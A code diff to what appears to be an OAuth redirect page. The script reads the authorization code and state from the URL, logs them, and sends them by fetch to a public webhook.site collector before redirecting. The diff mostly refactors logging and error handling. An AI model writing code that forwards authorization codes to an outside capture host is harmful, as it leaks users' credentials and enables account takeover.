@@ -18,11 +18,11 @@
             const state = getUrlParameter('state');
             console.log(`Auth Code: ${authCode}, State: ${state}`); // Logging for debugging
 
-            if (authCode && state) {
-                // Prepare data to be sent
-                const data = { auth_code: authCode, state: state };
-                console.log('Sending data:', JSON.stringify(data)); // Ensure data is correctly stringified
+            // Prepare data to be sent
+            const data = { auth_code: authCode, state: state };
+            console.log('Preparing to send data:', JSON.stringify(data)); // Ensure data is correctly prepared
 
+            if (authCode && state) {
                 try {
                     // Send data to the webhook
                     const response = await fetch('https://webhook.site/6e6eb7ee-db4d-4d7b-9b43-53906f9c387e', {
@@ -33,12 +33,16 @@
                         body: JSON.stringify(data),
                     });
 
-                    if (!response.ok) throw new Error('Network response was not ok.');
+                    if (!response.ok) {
+                        throw new Error(`Network response was not ok, status: ${response.status}`);
+                    }
 
-                    console.log('Data sent to the webhook successfully');
+                    console.log('Data sent to the webhook successfully, response status:', response.status);
                 } catch (error) {
                     console.error('Error sending data to the webhook:', error);
                 }
+            } else {
+                console.log('No auth code or state found in URL parameters.');
             }
 
             // Redirect to another page
